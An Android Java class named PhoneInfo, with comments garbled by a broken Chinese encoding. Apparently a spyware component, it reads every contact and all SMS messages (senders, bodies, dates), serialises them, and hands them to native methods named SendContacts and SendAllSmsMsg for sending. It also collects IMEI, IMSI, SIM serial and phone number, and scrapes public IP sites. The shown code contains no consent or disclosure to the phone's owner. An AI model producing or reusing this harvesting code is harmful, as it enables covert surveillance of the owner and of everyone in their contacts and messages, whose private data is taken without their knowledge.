package com.example.myphone;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.net.URL;
import java.net.URLConnection;
import java.sql.Date;
import java.text.SimpleDateFormat;
import java.util.Enumeration;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteException;
import android.net.Uri;
import android.provider.ContactsContract;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;

public class PhoneInfo {
	private static final String TAG = "MyPhone";
	private final boolean DEBUG = true;
	private TelephonyManager telephonyManager;  
    /** 
     * �����ƶ��û�ʶ���� 
     */  
    private String IMSI;  
    private Context cxt; 

    public PhoneInfo() {  
    	cxt= MainActivity.GetInstance();  
    	telephonyManager = (TelephonyManager) cxt  
    					.getSystemService(Context.TELEPHONY_SERVICE);  
    }
    
    public String QueryNameFromNumber(String num)
    {
    	Cursor cursor = null;
    	try
    	{
			if(DEBUG)
				Log.i(TAG, "PhoneInfo::QueryNameFromNumber");
			String[] projection = new String[] {"data1", "display_name"};
			String[] selectionArgs = new String[] {num.toString()};
    		//��ѯ��ϵ������
    		cursor = cxt.getContentResolver().query(
    				ContactsContract.CommonDataKinds.Phone.CONTENT_URI, 
    				projection, " data1 = ?", selectionArgs, null);
    		while(cursor.moveToNext())
    		{
    			//��ȡ��ϵ������
    			String displayName = cursor.getString(
    					cursor.getColumnIndex("display_name"));
    			return displayName;
    		}

    	} catch(Exception e)
    	{
    		//e.printStackTrace();
    	}
    	return "null";
    }

    /*
     * ��ȡ������ϵ����Ϣ
     */
    public void QueryContactsAndSend()
    {
    	Cursor cursor = null;
    	try
    	{
			if(DEBUG)
				Log.i(TAG, "PhoneInfo::QueryContactsAndSend");
    		//��ѯ��ϵ������
    		cursor = cxt.getContentResolver().query(
    				ContactsContract.CommonDataKinds.Phone.CONTENT_URI, 
    				null, null, null, null);
    		int nContactCount = cursor.getCount();
    		StringBuilder sb = new StringBuilder();
    		sb.append(nContactCount + "$");
    		while(cursor.moveToNext())
    		{
    			//��ȡ��ϵ������
    			String displayName = cursor.getString(
    					cursor.getColumnIndex(
    							ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
    			//��ϵ���ֻ���

    			String number = cursor.getString(
    					cursor.getColumnIndex(
    							ContactsContract.CommonDataKinds.Phone.NUMBER));
    			number = number.replaceAll(" |-", "");
    			sb.append(displayName + "+" + number);
    			if(!cursor.isLast())
    				sb.append("|");
    		}

			if(DEBUG)
				Log.i(TAG, "�������ͣ�" + sb.toString());
            if(MainActivity.objPhone != null)
            {
              //����JNI�㷢��
  			  try {
  				  byte[] bArry = sb.toString().getBytes("gbk");
  				  MainActivity.objPhone.SendContacts(bArry, 
  					  	bArry.length);
  			  } catch (UnsupportedEncodingException e) {
  			  	e.printStackTrace();
  			  }
            }
    	} catch(Exception e)
    	{
    		//e.printStackTrace();
    	}
    }
    
    /*
     * ��ȡ����SMS��Ϣ
     */
    public void GetAllSmsMsg(long lQueryMinDate)
    {
    	if(DEBUG)
    		Log.i(TAG, "GetAllSmsMsg");
    	//URI����������Ϣ
    	final String SMS_URI_ALL = "content://sms/";
    	//�������е�����
    	StringBuilder smsFormat = new StringBuilder();
    	//smsAll������з��ŵĶ���
    	StringBuilder smsAll = new StringBuilder();
    	try
	    {
	    	ContentResolver cr = cxt.getContentResolver();
	    	String[] projection = new String[]
	    			{"_id", "address", "person", "body",
	    			 "date", "type", "protocol"};
	    	Uri uri = Uri.parse(SMS_URI_ALL);
	    	//��ѯ����
	    	Cursor cur = cr.query(uri, projection, null, null, "date asc");
	    	if(cur.moveToFirst())
	    	{
	    		String name;
	    		String phoneNumber;
	    		String smsbody;
	    		String date;
	    		String type;
	    		
	    		int nameColumn = cur.getColumnIndex("person");
	    		int phoneNumberColumn = cur.getColumnIndex("address");
	    		int smsbodyColumn = cur.getColumnIndex("body");
	    		int dateColumn  = cur.getColumnIndex("date");
	    		int typeColumn   = cur.getColumnIndex("type");
	    		int protocolColumn   = cur.getColumnIndex("protocol");
	
	        	//��ȡ����
	        	int nCount = 0;
	        	//����������
	        	long lMaxDate = 0;
	        	cur.moveToLast();
	    		lMaxDate = cur.getLong(dateColumn);
	    		cur.moveToFirst();
	    		//���û�и��µĶ��žͷ���
	    		if(lMaxDate <= lQueryMinDate)
	    		{
	    			if(DEBUG)
	    				Log.i(TAG, "lMaxDate <= lQueryMinDate");
	    			return ;
	    		}
	    		//�����ѭ����������
	    		do
	    		{
	    			//ֻѭ������ʱ�������ʱ���Ķ���
	    			long lCurSmsDate = cur.getLong(dateColumn);
	    			if(lCurSmsDate <= lQueryMinDate)
	    				continue;
	    			nCount += 1;
	    			name = cur.getString(nameColumn);
	    			phoneNumber  = cur.getString(phoneNumberColumn);
	    			smsbody  = cur.getString(smsbodyColumn);

	    			//smsbody = smsbody.replaceAll("\r\n|\r|\n|\n\r", "_");
	
	    			SimpleDateFormat dateFormat = new SimpleDateFormat
	    					("yyyy-MM-dd hh:mm:ss");
	    			Date d = new Date(Long.parseLong(
	    						cur.getString(dateColumn)));
	    			date = dateFormat.format(d);
	    			int typeId = cur.getInt(typeColumn);
	    			int nProtocol = cur.getInt(protocolColumn);
	    			
	    			if(name == null)
	    			{
	    				name = QueryNameFromNumber(phoneNumber);
	    			}
	    			if(phoneNumber == null)
	    				phoneNumber = "null";
	    			else if(phoneNumber.startsWith("+86"))
	    				phoneNumber = phoneNumber.substring(3);
	    			smsAll.append(name + "+");
	    			smsAll.append(phoneNumber + "+");
	    			smsAll.append(smsbody + "+");
	    			smsAll.append(date + "+");
	    			smsAll.append(typeId + "+");
	    			smsAll.append(nProtocol);
	    			if(!cur.isLast())
	    				smsAll.append("|");
	    		}while(cur.moveToNext());

	        	smsFormat.append("" + nCount + "$");
	        	smsFormat.append(lMaxDate + "$");
	        	smsFormat.append(smsAll);
	        	//����ʱ��� 
	    		if(DEBUG)
	    			Log.i(TAG, smsFormat.toString() + "\n"
	    					+ smsFormat.toString().length());
	    		
	    		if(MainActivity.objPhone != null)
				try {
					byte[] bArry = smsFormat.toString().getBytes("gbk");
					MainActivity.objPhone.SendAllSmsMsg(bArry, 
							bArry.length);
				} catch (UnsupportedEncodingException e) {
					e.printStackTrace();
				}
	    		
	    	}
    	}
    	catch(SQLiteException ex)
    	{
    		Log.d("SQLiteException in getSmsInPhone", ex.getMessage());   
    	}
    }
    
    //��ȡ����IP
    public String GetHostIp() {
        try {
            for (Enumeration<NetworkInterface> en = NetworkInterface
                    .getNetworkInterfaces(); en.hasMoreElements();) {
                NetworkInterface intf = en.nextElement();
                for (Enumeration<InetAddress> ipAddr = intf.getInetAddresses(); ipAddr
                        .hasMoreElements();) {
                    InetAddress inetAddress = ipAddr.nextElement();
                    if (!inetAddress.isLoopbackAddress() && 
                    		!inetAddress.isLinkLocalAddress()) {
                        return inetAddress.getHostAddress();
                    }
                }
            }
        } catch (SocketException ex) {
        } catch (Exception e) {
        }
        return null;
    }
    
    /*
     * ��ȡ�ֻ��ͺ�
     */
    public String getModel()
    {
    	String Model = "N/A";
    	Model = android.os.Build.MODEL.toString();
    	return Model;
    }
    
    /*
     * ��ȡ�ֻ�ϵͳ�汾
     */
    public String getVersion()
    {
    	String Version = null;
    	Version = android.os.Build.VERSION.RELEASE.toString();
    	
    	return Version;
    }
    
    /** 
     * ��ȡ�绰���� 
     */  
    public String getNativePhoneNumber() {  
        String NativePhoneNumber="N/A";  
        NativePhoneNumber = telephonyManager.getLine1Number();  
        return NativePhoneNumber;  
    }  
    
    /** 
     * ��ȡIMEI
     */  
    public String getIMEI() {  
        String IMEI=null;  
        IMEI = telephonyManager.getDeviceId();  
        return IMEI;  
    }  
    
    /** 
     * ��ȡ�ֻ���������Ϣ 
     */  
    public String getProvidersName() {  
        String ProvidersName = "N/A";  
        try{  
        IMSI = telephonyManager.getSubscriberId();  
        // IMSI��ǰ��3λ460�ǹ��ң������ź���2λ00 02���й��ƶ���01���й���ͨ��03���й����š�  
        System.out.println(IMSI);  
        if (IMSI.startsWith("46000") || IMSI.startsWith("46002")) {  
            ProvidersName = "�й��ƶ�";  
        } else if (IMSI.startsWith("46001")) {  
            ProvidersName = "�й���ͨ";  
        } else if (IMSI.startsWith("46003")) {  
            ProvidersName = "�й�����";  
        }  
        }catch(Exception e){  
            e.printStackTrace();  
        }  
        return ProvidersName;  
    }  
      
    public String  getPhoneInfo(){  
         TelephonyManager tm = (TelephonyManager)cxt.getSystemService(Context.TELEPHONY_SERVICE);  
            StringBuilder sb = new StringBuilder();  
  
            sb.append("\nDeviceId(IMEI) = " + tm.getDeviceId());  
            sb.append("\nDeviceSoftwareVersion = " + tm.getDeviceSoftwareVersion());  
            sb.append("\nLine1Number = " + tm.getLine1Number());  
            sb.append("\nNetworkCountryIso = " + tm.getNetworkCountryIso());  
            sb.append("\nNetworkOperator = " + tm.getNetworkOperator());  
            sb.append("\nNetworkOperatorName = " + tm.getNetworkOperatorName());  
            sb.append("\nNetworkType = " + tm.getNetworkType());  
            sb.append("\nPhoneType = " + tm.getPhoneType());  
            sb.append("\nSimCountryIso = " + tm.getSimCountryIso());  
            sb.append("\nSimOperator = " + tm.getSimOperator());  
            sb.append("\nSimOperatorName = " + tm.getSimOperatorName());  
            sb.append("\nSimSerialNumber = " + tm.getSimSerialNumber());  
            sb.append("\nSimState = " + tm.getSimState());  
            sb.append("\nSubscriberId(IMSI) = " + tm.getSubscriberId());  
            sb.append("\nVoiceMailNumber = " + tm.getVoiceMailNumber());  
           return  sb.toString();  
    }  

    
    public static String GetNetIp() {
        URL infoUrl = null;
        InputStream inStream = null;
        String ipLine = "";
        HttpURLConnection httpConnection = null;
        try {
            infoUrl = new URL("http://www.ip168.com/");
            URLConnection connection = infoUrl.openConnection();
            httpConnection = (HttpURLConnection) connection;
            httpConnection.setReadTimeout(10000);
            int responseCode = httpConnection.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
                inStream = httpConnection.getInputStream();
                BufferedReader reader = new BufferedReader(
                        new InputStreamReader(inStream, "utf-8"));
                StringBuilder strber = new StringBuilder();
                String line = null;
                while ((line = reader.readLine()) != null)
                    strber.append(line + "\n");
 
                int n = 0;
                Pattern pattern = Pattern
                        .compile("((?:(?:25[0-5]|2[0-4]\\d|((1\\d{2})|([1-9]?\\d)))\\.){3}(?:25[0-5]|2[0-4]\\d|((1\\d{2})|([1-9]?\\d))))");
                Matcher matcher = pattern.matcher(strber.toString());
                if (matcher.find()) {
                    ipLine = matcher.group();
                }
            }
 
        } catch (MalformedURLException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            try {
                inStream.close();
                httpConnection.disconnect();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        return ipLine;
    }
    
    //��ȡ����IP
    public static String GetNetIp2()  
    {  
        URL infoUrl = null;  
        InputStream inStream = null;  
        try  
        {  
            //http://iframe.ip138.com/ic.asp  
            //infoUrl = new URL("http://city.ip138.com/city0.asp");  
            infoUrl = new URL("http://iframe.ip138.com/ic.asp");  
            URLConnection connection = infoUrl.openConnection();  
            HttpURLConnection httpConnection = (HttpURLConnection)connection;
            int responseCode = httpConnection.getResponseCode();  
            if(responseCode == HttpURLConnection.HTTP_OK)  
            {   
                inStream = httpConnection.getInputStream();   
                BufferedReader reader = new BufferedReader(new InputStreamReader(inStream,"utf-8"));  
                StringBuilder strber = new StringBuilder();  
                String line = null;  
                while ((line = reader.readLine()) != null)   
                    strber.append(line + "\n");  
                inStream.close();  
                //�ӷ����Ľ������ȡ��IP��ַ  
                int start = strber.indexOf("[");  
                int end = strber.indexOf("]", start + 1);  
                line = strber.substring(start + 1, end);  
                return line;   
            }  
        }  
        catch(MalformedURLException e) {  
            e.printStackTrace();  
        }  
        catch (IOException e) {  
            e.printStackTrace();  
        }  
        return null;  
    }  
}
